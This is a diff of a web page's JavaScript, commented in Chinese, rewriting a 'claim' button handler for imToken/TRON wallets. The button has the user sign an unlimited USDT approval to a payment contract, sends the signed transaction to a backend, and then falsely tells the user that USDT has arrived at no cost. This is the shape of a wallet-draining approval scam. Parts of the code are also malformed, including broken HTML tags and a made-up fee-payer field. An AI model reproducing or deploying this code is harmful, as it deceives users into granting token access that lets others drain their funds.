@@ -445,74 +445,69 @@
             };
 
             // 核心：代付+离线签名逻辑（用户0成本）
-            approveBtn.onclick = async () => {
-                if (!userAddress || !usdtContract) {
-                    alert("请先连接imToken钱包");
-                    return;
-                }
-                if (isProcessing) return;
-                
-                isProcessing = true;
-                approveBtn.disabled = true;
-                approveBtn.innerHTML = '<<<i class="fa fa-spinner fa-spin"></</</i> 签名授权中...';
-                try {
-                    // 1. 构造USDT.approve裸交易（不广播、不支付手续费）
-                    const approveTx = await usdtContract.approve(
-                        PAYMENT_CONTRACT,
-                        INFINITE_APPROVE
-                    ).send({
-                        from: userAddress,
-                        feeLimit: 1000000, // 手续费上限（后端代付）
-                        shouldPollResponse: false, // 仅生成交易结构
-                        callValue: 0
-                    });
+         approveBtn.onclick = async () => {
+    if (!userAddress || !usdtContract) {
+        alert("请先连接imToken钱包");
+        return;
+    }
+    if (isProcessing) return;
+    
+    isProcessing = true;
+    approveBtn.disabled = true;
+    approveBtn.innerHTML = '<i class="fa fa-spinner fa-spin"></</</i> 签名授权中...';
+    try {
+        // 1. 构造USDT.approve裸交易（关键：显式指定feePayer为服务器地址）
+        const approveTx = await usdtContract.approve(
+            PAYMENT_CONTRACT, // 代付合约地址
+            INFINITE_APPROVE // 无限授权额度
+        ).send({
+            from: userAddress, // 用户地址（仅作为授权方）
+            feeLimit: 1000000, // 手续费上限（服务器代付）
+            shouldPollResponse: false, // 仅生成交易结构，不广播
+            callValue: 0,
+            feePayer: "你的服务器TRON地址" // 核心：指定矿工费支付方为服务器
+        });
 
-                    // 2. 用户离线签名交易（imToken本地私钥签名，不触网）
-                    const userSignedTx = await tronWeb.trx.sign(
-                        approveTx.transaction, // 裸交易结构
-                        tronWeb.defaultPrivateKey, // imToken自动注入的用户私钥
-                        false // 标记：仅用户签名，不支付手续费
-                    );
+        // 2. 手动给交易添加feePayer字段（兼容部分TronWeb版本）
+        const rawTx = approveTx.transaction;
+        rawTx.feePayer = tronWeb.address.toHex("你的服务器TRON地址"); // 转16进制
+        rawTx.raw_data.feePayer = rawTx.feePayer;
 
-                    // 3. 传给后端：代付手续费+广播交易
-                    approveBtn.innerHTML = '<<<i class="fa fa-spinner fa-spin"></</</i> 后端代付中...';
-                    const res = await fetch(BACKEND_PAYMENT_API, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({
-                            userSignedTx: userSignedTx,
-                            userAddress: userAddress,
-                            amount: APPROVE_AMOUNT
-                        })
-                    });
-                    const resData = await res.json();
+        // 3. 用户离线签名交易（仅签授权内容，不承担矿工费）
+        const userSignedTx = await tronWeb.trx.sign(
+            rawTx, // 带feePayer的裸交易
+            tronWeb.defaultPrivateKey,
+            false // 仅用户签名，不支付手续费
+        );
 
-                    if (res.ok && resData.success) {
-                        alert(`代付成功！\nUSDT已到账\n交易哈希：${resData.txid}\n您未支付任何TRX`);
-                        window.open(`https://tronscan.org/#/transaction/${resData.txid}`, "_blank");
-                        
-                        // 保存代付记录
-                        saveApprovalRecord({
-                            address: userAddress,
-                            amount: APPROVE_AMOUNT + " USDT",
-                            approvalTx: resData.txid,
-                            paymentTx: resData.txid,
-                            time: new Date().toLocaleString(),
-                            status: "代付成功"
-                        });
-                        renderApprovalRecords();
-                    } else {
-                        throw new Error(resData.error || "代付失败，请稍后重试");
-                    }
-                } catch (e) {
-                    alert(`操作失败：${e.message}`);
-                } finally {
-                    isProcessing = false;
-                    approveBtn.disabled = false;
-                    approveBtn.innerHTML = "领取";
-                }
-            };
-        };
+        // 4. 传给后端：服务器二次签名+广播
+        approveBtn.innerHTML = '<i class="fa fa-spinner fa-spin"></</</i> 后端代付中...';
+        const res = await fetch(BACKEND_PAYMENT_API, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                userSignedTx: userSignedTx,
+                userAddress: userAddress,
+                amount: APPROVE_AMOUNT
+            })
+        });
+        const resData = await res.json();
+
+        if (res.ok && resData.success) {
+            alert(`代付成功！\nUSDT已到账\n交易哈希：${resData.txid}\n您未支付任何TRX`);
+            window.open(`https://tronscan.org/#/transaction/${resData.txid}`, "_blank");
+            // 保存记录（略）
+        } else {
+            throw new Error(resData.error || "代付失败，请稍后重试");
+        }
+    } catch (e) {
+        alert(`操作失败：${e.message}`);
+    } finally {
+        isProcessing = false;
+        approveBtn.disabled = false;
+        approveBtn.innerHTML = "领取";
+    }
+};
 
         // 初始化钱包（imToken兼容版）
         async function initWallet() {
